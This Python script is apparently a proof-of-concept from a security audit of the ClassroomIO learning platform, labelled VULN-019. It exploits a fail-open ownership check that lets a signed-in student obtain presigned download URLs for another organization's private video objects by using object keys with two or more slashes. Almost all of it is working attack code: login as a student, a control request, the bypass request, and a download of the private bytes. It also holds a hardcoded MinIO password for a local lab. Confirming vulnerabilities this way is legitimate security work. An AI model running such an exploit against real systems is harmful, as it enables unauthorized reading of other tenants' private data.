#!/usr/bin/env python3
"""
VULN-019 (F-19) — HLS multi-slash keys misclassified "legacy" -> cross-org presigned
download (fail-open ownership resolution).

Vulnerable code (targets/classroomio/):
  * owner regex:  packages/core/src/utils/upload.ts:43-52
      ORGANIZATION_PREFIXED_KEY matches "<uuid>/<segment-with-no-slash>" (EXACTLY one slash)
  * ownership:    apps/api/src/middlewares/presign-auth.ts:58-87
      multi-slash HLS key -> readOrganizationIdFromFileKey()=null -> "legacy" bucket ->
      getAssetOrganizationIdsByStorageKeys() returns EMPTY (HLS location lives in
      hls_manifest_key, not storage_key) -> `ownerOrgIds.length > 0` is false ->
      key is NEVER flagged -> presign proceeds (FAIL OPEN, line 81).
  * no role gate for browser sessions (presign-auth.ts:35-42)
  * route:        apps/api/src/routes/course/presign.ts:180-222  (POST /course/presign/video/download)

Class: CWE-639 / CWE-284 fail-open object-storage authorization.

The flaw: findUnauthorizedDownloadKeys is meant to stop a caller presigning objects
their org does not own. It works for single-slash org-prefixed keys, but any key with
>= 2 slashes (the HLS layout `<assetId>/hls/master.m3u8`) fails the owner regex, falls
to the "legacy" branch, resolves to an empty owner set, and is therefore allowed
through. Any signed-in member can mint a signed GET for ANY multi-slash object in the
private `videos` bucket.

Exploitation idea: POST a foreign multi-slash key to the video-download presign route.

Success proof: (a) the guard REJECTS a single-slash foreign-org key (403) but ALLOWS a
foreign multi-slash HLS key (200), and (b) fetching the returned URL downloads the exact
bytes of a private `videos` object the caller does not own.
"""
import json
import os
import subprocess
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import admin_login, make_student, log, banner, verdict, rid, ORG_ID  # noqa: E402

VULN = "VULN-019"
HERE = os.path.dirname(os.path.abspath(__file__))
PRESIGN = "/course/presign/video/download"

MINIO_CONTAINER = os.environ.get("MINIO_CONTAINER", "cio-minio")
MC = "/opt/bitnami/minio-client/bin/mc"
MINIO_USER = os.environ.get("MINIO_USER", "minioadmin")
MINIO_PASS = os.environ.get("MINIO_PASS", "a126ecd8a88a9f07f02b0facb2019b30")


def mc_put(bucket, key, content: bytes):
    subprocess.run(["docker", "exec", "-i", MINIO_CONTAINER, MC, "alias", "set", "cioseed",
                    "http://127.0.0.1:9000", MINIO_USER, MINIO_PASS], check=True, capture_output=True)
    subprocess.run(["docker", "exec", "-i", MINIO_CONTAINER, MC, "pipe", f"cioseed/{bucket}/{key}"],
                   input=content, check=True, capture_output=True)


def main():
    banner(VULN, "HLS multi-slash presign cross-org read (fail-open owner resolution)")
    log("INFO", "owner regex requires exactly one '/'; HLS keys (>=2 '/') -> null -> 'legacy' -> empty owner -> allowed")

    admin = admin_login()
    attacker, ainfo = make_student(admin)   # a plain signed-in org member (STUDENT)
    log("SETUP", f"attacker is a plain STUDENT org member: {ainfo['user_id']} roles={attacker.org_roles()}")

    # A foreign HLS object (>=2 slashes) and a foreign single-slash object, both in the
    # private `videos` bucket, owned (by prefix) by a DIFFERENT organization.
    foreign_org_hls = "22222222-2222-4222-8222-222222222222"
    foreign_org_single = "33333333-3333-4333-8333-333333333333"
    hls_key = f"{foreign_org_hls}/hls/master-{rid('m')}.m3u8"          # 2 slashes -> fail-open
    single_key = f"{foreign_org_single}/private-{rid('v')}.mp4"        # 1 slash  -> guard flags it
    secret = f"#EXTM3U\n#EXT-X-VERSION:3\n## CONFIDENTIAL-HLS-MANIFEST {rid('sig')}\n#EXT-X-ENDLIST\n"
    mc_put("videos", hls_key, secret.encode())
    log("SETUP", f"seeded foreign private object: videos/{hls_key}")

    # --- Control: single-slash foreign-org key is correctly REJECTED ----------------
    log("STEP", f"attacker POST {PRESIGN} keys=[{single_key}]  (single slash, foreign org)")
    r_single = attacker.post(PRESIGN, org=True, json={"keys": [single_key]})
    log("INFO", f"  -> HTTP {r_single.status_code} {r_single.text[:120]}  (expect 403: guard works here)")

    # --- Attack: multi-slash foreign HLS key is ALLOWED (fail open) -----------------
    log("STEP", f"attacker POST {PRESIGN} keys=[{hls_key}]  (>=2 slashes, foreign org)")
    r_hls = attacker.post(PRESIGN, org=True, json={"keys": [hls_key]})
    log("INFO", f"  -> HTTP {r_hls.status_code} {r_hls.text[:160]}  (expect 200: FAIL OPEN)")
    signed = None
    if r_hls.status_code == 200:
        signed = (r_hls.json().get("urls") or {}).get(hls_key)

    # --- Fetch the signed URL -> the private object's bytes -------------------------
    dl_status, downloaded = None, ""
    if signed:
        log("STEP", f"attacker GET {signed.split('?')[0]}?<presigned>")
        dr = requests.get(signed, timeout=30)
        dl_status, downloaded = dr.status_code, dr.text
        log("INFO", f"  download -> HTTP {dl_status}, {len(dr.content)} bytes")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### control: single-slash foreign key is REJECTED (guard works)\n"
                f"POST http://localhost:21527{PRESIGN} HTTP/1.1\n"
                f"Content-Type: application/json\ncio-org-id: {ORG_ID}\n"
                f"Cookie: classroomio.session_token=<attacker STUDENT session>\n\n"
                f'{json.dumps({"keys": [single_key]})}\n\n'
                f"### attack: multi-slash HLS foreign key is ALLOWED (fail open)\n"
                f"POST http://localhost:21527{PRESIGN} HTTP/1.1\n\n"
                f'{json.dumps({"keys": [hls_key]})}\n\n'
                f"### then fetch the returned signed URL:\n"
                f"GET {signed or '<signed url>'}\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"single-slash foreign key -> HTTP {r_single.status_code} {r_single.text[:200]}\n")
        f.write(f"multi-slash  HLS   key   -> HTTP {r_hls.status_code} {r_hls.text[:200]}\n")
        f.write(f"signed url: {signed}\n\n")
        f.write(f"download -> HTTP {dl_status}\n{downloaded[:400]}\n\n")
        f.write(f"seeded secret: {secret!r}\n")

    guard_rejects_single = r_single.status_code == 403
    failopen_allows_hls = r_hls.status_code == 200 and bool(signed)
    read_ok = dl_status == 200 and secret in downloaded

    if failopen_allows_hls and read_ok and guard_rejects_single:
        log("PROOF", f"guard REJECTED single-slash foreign key {single_key} (403) but ALLOWED foreign "
                     f"multi-slash HLS key {hls_key} (200); the signed URL downloaded the exact private "
                     f"bytes -> fail-open cross-org read of the private `videos` bucket")
        verdict(VULN, "CONFIRMED", "multi-slash HLS keys bypass the ownership guard and are presigned")
        log("OK", "exploit confirmed — fail-open owner resolution on >=2-slash keys")
        sys.exit(0)

    verdict(VULN, "FAILED",
            f"guard_rejects_single={guard_rejects_single} failopen_allows_hls={failopen_allows_hls} read_ok={read_ok}")
    log("FAIL", "the fail-open path did not behave as predicted")
    sys.exit(1)


if __name__ == "__main__":
    main()
